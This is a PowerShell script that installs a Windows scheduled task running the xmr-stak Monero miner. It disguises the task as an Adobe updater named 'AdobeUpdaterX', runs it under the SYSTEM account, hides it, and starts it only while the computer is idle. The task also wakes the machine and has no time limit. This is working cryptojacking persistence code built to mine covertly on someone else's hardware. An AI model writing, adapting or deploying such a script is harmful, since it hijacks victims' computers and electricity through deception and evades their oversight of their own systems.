

$rootFolder = $PSScriptRoot

$cmWorkingDirectory = [system.io.path]::Combine($rootFolder, "xmr-stak")
$taskCommand = [system.io.path]::Combine($rootFolder, "xmr-stak\xmr-stak.exe")
$taskArgument = "";	

$taskName = "AdobeUpdaterX";
$taskDescription = "Adobe Updater neXt";



# -------------- Register Task

if((Test-Path variable:global:TASK_TRIGGER_EVENT) -eq $false)
{
# typedef enum  {
New-Variable -Name TASK_TRIGGER_EVENT                 -Value 0 -Option constant
New-Variable -Name TASK_TRIGGER_TIME                  -Value 1 -Option constant
New-Variable -Name TASK_TRIGGER_DAILY                 -Value 2 -Option constant
New-Variable -Name TASK_TRIGGER_WEEKLY                -Value 3 -Option constant
New-Variable -Name TASK_TRIGGER_MONTHLY               -Value 4 -Option constant
New-Variable -Name TASK_TRIGGER_MONTHLYDOW            -Value 5 -Option constant
New-Variable -Name TASK_TRIGGER_IDLE                  -Value 6 -Option constant
New-Variable -Name TASK_TRIGGER_REGISTRATION          -Value 7 -Option constant
New-Variable -Name TASK_TRIGGER_BOOT                  -Value 8 -Option constant
New-Variable -Name TASK_TRIGGER_LOGON                 -Value 9 -Option constant
New-Variable -Name TASK_TRIGGER_SESSION_STATE_CHANGE  -Value 11 -Option constant
# }   TASK_TRIGGER_TYPE2;
}


if((Test-Path variable:global:TASK_ACTION_EXEC) -eq $false)
{
# typedef enum  { 
New-Variable -Name TASK_ACTION_EXEC          -Value 0 -Option constant
New-Variable -Name TASK_ACTION_COM_HANDLER   -Value 5 -Option constant
New-Variable -Name TASK_ACTION_SEND_EMAIL    -Value 6 -Option constant
New-Variable -Name TASK_ACTION_SHOW_MESSAGE  -Value 7 -Option constant
# } TASK_ACTION_TYPE;
}
if((Test-Path variable:global:TASK_VALIDATE_ONLY) -eq $false)
{
# typedef enum  {
New-Variable -Name TASK_VALIDATE_ONLY                -Value 0 -Option constant
New-Variable -Name TASK_CREATE                       -Value 2 -Option constant
New-Variable -Name TASK_UPDATE                       -Value 4 -Option constant
New-Variable -Name TASK_CREATE_OR_UPDATE             -Value 6 -Option constant
New-Variable -Name TASK_DISABLE                      -Value 8 -Option constant
New-Variable -Name TASK_DONT_ADD_PRINCIPAL_ACE       -Value 10 -Option constant
New-Variable -Name TASK_IGNORE_REGISTRATION_TRIGGERS -Value 20 -Option constant
# } TASK_CREATION;
}
if((Test-Path variable:global:TASK_LOGON_NONE) -eq $false)
{
# typedef enum  {
New-Variable -Name TASK_LOGON_NONE                          -Value 0 -Option constant
New-Variable -Name TASK_LOGON_PASSWORD                      -Value 1 -Option constant
New-Variable -Name TASK_LOGON_S4U                           -Value 2 -Option constant
New-Variable -Name TASK_LOGON_INTERACTIVE_TOKEN             -Value 3 -Option constant
New-Variable -Name TASK_LOGON_GROUP                         -Value 4 -Option constant
New-Variable -Name TASK_LOGON_SERVICE_ACCOUNT               -Value 5 -Option constant
New-Variable -Name TASK_LOGON_INTERACTIVE_TOKEN_OR_PASSWORD -Value 6 -Option constant
# } TASK_LOGON_TYPE;
}


function Get-ScheduleService
{
	New-Object -ComObject schedule.service
} #end Get-ScheduleService

function Get-Tasks($folder)
{ #returns a task object
 $folder.GetTasks(1)
} #end Get-Tasks

function Get-Task($folder,$name)
{ #returns a task object
 $folder.GetTask($name)
} #end Get-Tasks

function New-TaskObject($path)
{ #returns a taskfolder object
 $taskObject = Get-ScheduleService
 $taskObject.Connect()
 if(-not $path) { $path = "\" }
 $taskObject.GetFolder($path)
} #end New-TaskObject

function New-Task($path,$Name,$description,$author,$command,$arguments, $user,$password,$sddl)
{ 
	$user=$password=$sddl=$null
	$taskObject = Get-ScheduleService
	$taskObject.Connect()
	if(-not $path) { $path = "\" }
	$rootFolder = $taskObject.GetFolder($path)
	$taskdefinition = $taskObject.NewTask($null)

	$pr = $taskdefinition.Principal
	$pr.Id ="NTAuthority\SYSTEM"
    #$pr.Id ="NTAuthority\Administrators"
	$pr.LogonType = $TASK_LOGON_SERVICE_ACCOUNT
	$pr.RunLevel = 1
    #$user = "Administrators"
	$user = "SYSTEM"

	$regInfo = $taskdefinition.RegistrationInfo
	if(-not $description) { $description = "Created by script" }
	$regInfo.Description = $description
	if(-not $author) { $author = $env:username }
	$regInfo.Author = $author
	# ------------ settings
	$settings = $taskdefinition.Settings
	$settings.StopIfGoingOnBatteries = $false
	$settings.DisallowStartIfOnBatteries = $false
	$settings.StartWhenAvailable = $true
	$settings.RunOnlyIfNetworkAvailable = $false
	$settings.ExecutionTimeLimit = "PT0S"
	$settings.Compatibility = 4
	$settings.Hidden = $true
	$settings.RunOnlyIfIdle = $true
	$settings.WakeToRun = $true
	$idleSettings = $settings.IdleSettings
	$idleSettings.WaitTimeout = "PT0S"
	$idleSettings.IdleDuration = "PT5M"
	$idleSettings.RestartOnIdle = $true
	# ------------ triggers
	$triggers = $taskdefinition.Triggers
	$trigger = $triggers.Create($TASK_TRIGGER_IDLE)
    # ------------ actions
	$action = $taskdefinition.Actions.Create($TASK_ACTION_EXEC)
	$action.Path = $command
	$action.Arguments = $arguments
    $action.WorkingDirectory = $cmWorkingDirectory
	

	#HRESULT RegisterTaskDefinition(
	#[in]           BSTR            path,
	#[in]           ITaskDefinition *pDefinition,
	#[in]           LONG            flags,  (TASK_CREATION)
	#[in]           VARIANT         userId,
	#[in]           VARIANT         password,
	#[in]           TASK_LOGON_TYPE logonType,
	#[in, optional] VARIANT         sddl,
	#[out]          IRegisteredTask **ppTask);

	$res = $rootFolder.RegisterTaskDefinition($Name,$taskdefinition,$TASK_CREATE_OR_UPDATE, $user,$password,$TASK_LOGON_SERVICE_ACCOUNT,$sddl)

} #end New-Task

Function Remove-Task($folder,$name)
{
 $folder.DeleteTask($name,$null)
} #end Remove-Task


$taskExists = Get-ScheduledTask | Where-Object {$_.TaskName -like $taskName }
#if($taskExists) { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false }
#$tsAction = New-ScheduledTaskAction -Execute $cmpath -Argument $argument
#$tsTrigger =  New-ScheduledTaskTrigger -AtLogOn
#$tsIdle = New-TimeSpan -Minutes 5
#$tsSet = New-ScheduledTaskSettingsSet -RunOnlyIfIdle -IdleDuration ([Timespan]::FromMinutes(5)) -IdleWaitTimeout ([TimeSpan]::Zero)
#$tsSet = New-ScheduledTaskSettingsSet -RunOnlyIfIdle  -IdleDuration 00:05:00 -IdleWaitTimeout 00:00:00
#Register-ScheduledTask -Action $action -TaskName $taskName -Description $taskDescription -Settings $tsSet
#$tsTask = New-ScheduledTask  -Action $tsAction -Settings $tsSet
#Register-ScheduledTask -TaskName $taskName -InputObject $tsTask



New-Task -command $taskCommand -arguments $taskArgument -name $taskName -description $taskDescription

#sleep -Milliseconds 5000




# *** entry point to script ***

# Get-Tasks -folder (New-taskObject -path "\microsoft\windows\defrag")
# Returns a collection of task objects representing each task in the defrag folder

#$vt =  Get-Task -folder (New-taskObject -path "\") -name "Dash"
#$svt = $vt.Definition.Settings
# returns a task object representing the Test idle trigger task in the root folder  

# New-Task -command "C:\Windows\System32\notepad.exe" -name "test idle trigger"
# Creates task to run notepad. task is stored in root and named test idle trigger

# New-Task -command "C:\Windows\System32\notepad.exe" -path "\hsg" `
#  -name "test idle trigger"

# Creates task to run notepad. task is named test idle trigger and 
# is stored in root\hsg folder.

# Remove-Task -folder (New-taskObject) -name "test idle trigger"
# Deletes a scheduled task named "test idle trigger" from the root folder

# Remove-Task -folder (New-taskObject -path "\hsg") -name "test idle trigger"
# Deletes a scheduled task named "test idle trigger" from the root\hsg folder